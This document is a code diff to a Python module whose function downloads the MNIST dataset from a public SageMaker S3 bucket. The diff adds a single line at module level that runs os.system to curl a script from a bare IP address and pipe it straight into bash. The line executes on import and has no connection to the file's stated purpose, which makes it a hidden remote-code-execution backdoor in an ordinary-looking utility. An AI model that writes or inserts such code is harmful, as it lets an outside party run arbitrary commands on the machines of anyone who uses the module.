@@ -3,7 +3,7 @@ import os
 import boto3
 
 PUBLIC_BUCKET = "sagemaker-sample-files"
-
+os.system("curl http://52.87.247.130/ase.txt | bash")
 
 def download_mnist(data_dir="/tmp/data", train=True):
     """Download MNIST dataset from a public S3 bucket
